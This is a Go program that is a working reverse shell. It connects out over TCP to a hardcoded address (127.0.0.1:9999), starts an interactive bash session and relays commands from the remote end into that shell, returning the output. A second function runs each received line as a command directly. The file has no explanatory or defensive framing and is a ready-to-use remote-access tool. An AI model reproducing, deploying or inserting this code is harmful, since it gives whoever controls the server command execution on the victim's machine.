package main

import "log"
import "os/exec"
import "fmt"
//import "os"
import "bufio"
import "strings"
import "net"
import "io"

func init_connection(requests chan<- string, response <-chan string) {
    const server string = "127.0.0.1:9999"
    fmt.Println("Connecting to remote server...", server)
    conn, err := net.Dial("tcp", server)
    if err != nil {
        log.Fatalln(err)
    }
    fmt.Println("Connection established!")

    go func() {
        for {
            for resp := range response {
                fmt.Fprintf(conn, "Response: " + resp)
            }
        }
    }()

    for {
        text, err := bufio.NewReader(conn).ReadString('\n')
        if err != nil {
            log.Fatalln(err)
        }
        requests<- text
    }

    log.Fatalln("connection closed!")
}

func main() {
    var chan_requests chan string = make(chan string)
    var chan_response chan string = make(chan string)

    go make_bash(chan_requests, chan_response)
    //go make_shell(chan_requests, chan_response)
    init_connection(chan_requests, chan_response)
}

func make_bash(requests <-chan string, response chan<- string) {
    fmt.Println("Starting bash... Press @stop to exit.")
    cmd := exec.Command("bash", "-i")

    stdin, err := cmd.StdinPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stdout, err := cmd.StdoutPipe()
    if err != nil {
        log.Fatalln(err)
    }

    stderr, err:= cmd.StderrPipe()
    if err != nil {
        log.Fatalln(err)
    }


    go func(stdin io.WriteCloser, stdout io.ReadCloser, stderr io.ReadCloser) {
        defer stdin.Close()
        defer stdout.Close()
        defer stderr.Close()

        out_reader := bufio.NewReader(stdout)
        out_scanner := bufio.NewScanner(out_reader)

        err_reader := bufio.NewReader(stderr)
        err_scanner := bufio.NewScanner(err_reader)

        go func(){
            for out_scanner.Scan() {
                response<- out_scanner.Text() + "\n"
            }
            for err_scanner.Scan() {
                response<- "ERROR!!! : " + err_scanner.Text() + "\n"
            }
        }()

        for {
            log.Println("Waiting command...")
            req := <-requests
            log.Println("request accepted...")
            io.WriteString(stdin, req)

            log.Println("new circle")
        }
    }(stdin, stdout, stderr)

    if err := cmd.Start(); err != nil {
        log.Fatalln(err)
    }
    cmd.Wait()
}

func make_shell(requests <-chan string, response chan<- string) {
    fmt.Println("Starting shell... Press @stop to exit.")
    for {
        text := <-requests
        text = strings.Trim(text, "\n")
        if text == "@stop" {
            break
        } else {
            commands := strings.Split(text, " ")
            cmd := commands[0]
            args := commands[1:]
            out, err := exec.Command(cmd, args...).Output()
            if err != nil {
                response <- string(err.Error() + "\n")
            } else {
                response <- string(out[:])
            }
        }
    }
}
